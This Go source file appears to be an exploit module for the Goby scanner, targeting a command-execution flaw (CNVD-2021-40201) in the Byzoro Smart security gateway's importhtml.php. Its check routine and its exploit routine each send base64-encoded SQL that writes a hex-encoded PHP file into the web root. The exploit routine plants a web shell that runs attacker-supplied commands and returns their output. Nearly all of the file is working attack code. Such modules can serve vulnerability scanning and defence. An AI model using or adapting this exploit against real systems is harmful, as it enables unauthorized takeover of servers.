package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Byzoro smart importhtml.php RCE (CNVD-2021-40201)",
  "Description": "Byzoro Networks Smart multi-service security gateway intelligent management platform has a command execution vulnerability. Attackers can use this vulnerability to gain control of the server.",
  "Product": "Byzoro-Smart,Byzoro-Security-gateway",
  "Homepage": "https://www.byzoro.com/",
  "DisclosureDate": "2021-07-06",
  "Author": "1291904552@qq.com",
  "GobyQuery": "app=\"Byzoro-Smart\"||app=\"Byzoro-Security-gateway\"",
  "Level": "2",
  "Impact": "<p></p>",
  "Recommandation": "",
  "References": [
    "https://www.cnvd.org.cn/flaw/show/CNVD-2020-28786",
	"https://www.cnvd.org.cn/flaw/show/CNVD-2021-40201"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ExpTips": null,
  "ScanSteps": null,
  "ExploitSteps": null,
  "Tags": [
    "rce"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Byzoro-Smart","Byzoro-Security-gateway"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randFilename := goutils.RandomHexString(4)
			sqlQuery := `select 0x3c3f706870206563686f206d643528323333293b756e6c696e6b285f5f46494c455f5f293b3f3e into outfile '/usr/hddocs/nsg/app/`+randFilename+`.php'`
			uri_1 := `/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=`+base64.StdEncoding.EncodeToString([]byte(sqlQuery))
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					uri_2 := "/app/"+randFilename+".php"
					cfg_2 := httpclient.NewGetRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					if resp_2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						return resp_2.StatusCode == 200 && strings.Contains(resp_2.RawBody,"e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			randFilename := goutils.RandomHexString(4)
			sqlQuery := `select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/`+randFilename+`.php'`
			uri_1 := `/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=`+base64.StdEncoding.EncodeToString([]byte(sqlQuery))
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					uri_2 := "/app/"+randFilename+".php"
					cfg_2 := httpclient.NewPostRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.Header.Store("Content-Type","application/x-www-form-urlencoded")
					cfg_2.Data = fmt.Sprintf(`cmd=%s`,cmd)
					if resp_2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						if resp_2.StatusCode == 200{
							expResult.Output = resp_2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}


